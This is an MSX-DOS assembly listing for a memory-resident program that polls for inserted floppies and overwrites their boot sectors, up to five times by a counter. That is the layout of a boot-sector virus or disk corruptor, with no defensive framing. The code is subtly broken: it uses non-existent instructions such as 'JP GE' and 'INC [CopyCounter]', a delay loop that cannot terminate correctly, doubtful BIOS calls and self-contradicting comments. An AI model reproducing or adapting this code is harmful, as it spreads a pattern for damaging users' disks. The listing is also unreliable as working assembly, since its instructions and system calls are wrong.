        ORG    $100H         ; Start of the COM file (bootloader code)

START:
        DI                  ; Disable interrupts
        CALL    Init         ; Initialize the program
        CALL    StayResident ; Make the program resident
        CALL    MainLoop     ; Start the main loop

; ---- Initialization ----
Init:
        ; Set up the stack and necessary BIOS calls for memory-resident
        LD HL, $FFFF        ; Set stack pointer to end of RAM (usually)
        LD SP, HL
        LD BC, 0           ; Initialize counter to 0 (no copies made yet)
        RET

; ---- Stay Resident ----
StayResident:
        ; Make the program memory resident
        LD HL, $8000        ; Resident address for our program
        LD DE, $8000        ; Copy to this address
        LD BC, 0x0800       ; Size of program (2KB for example, adjust as needed)
        CALL  $5C00          ; MSX-DOS: Allocate memory (size in BC)
        RET

; ---- Main Loop ----
MainLoop:
        CALL    CheckFloppy  ; Check if a floppy disk is inserted
        CALL    Delay        ; Wait for 2 seconds
        JP      MainLoop     ; Repeat loop

; ---- Check Floppy ----
CheckFloppy:
        ; BIOS Call: 0x1A to check for floppy disk insertion
        LD A, $1A           ; MSX-DOS BIOS call for checking floppy
        CALL $0010          ; BIOS: Check floppy status
        JP Z, NoFloppy      ; If no floppy disk inserted, skip
        
        ; Check if 5 copies have been made
        LD A, [CopyCounter] ; Load copy counter into A
        CP 5                ; Compare with 5
        JP GE, NoCopy       ; If counter >= 5, don't copy anymore

        CALL    WriteNOPToBoot ; If counter < 5, write NOP to boot sector
        INC [CopyCounter]     ; Increment the copy counter
        RET

NoFloppy:
        RET

; ---- Write NOP to Boot Sector ----
WriteNOPToBoot:
        ; Write a NOP to the floppy disk's boot sector (start of the disk)
        LD HL, BootNOPCode  ; Address of the NOP code
        LD DE, $0200        ; Boot sector address (start of the disk)
        LD BC, 0x0100       ; Copy size (1 byte, but will copy NOP in 256-byte sectors)
        CALL $0026          ; BIOS call to copy memory to disk (write to boot sector)
        RET

NoCopy:
        RET

; ---- Delay for 2 seconds ----
Delay:
        LD BC, 0x1000       ; Loop count
DelayLoop:
        NOP                 ; No operation (wasting time)
        DEC BC
        JP NZ, DelayLoop    ; Repeat until delay is over
        RET

; ---- NOP Code ----
BootNOPCode:
        DB 0x00             ; The NOP instruction (0x00 in machine code)

; ---- Copy Counter Storage ----
CopyCounter:
        DB 0                ; Initialize copy counter (starts at 0)

; ---- End of Program ----
        END START
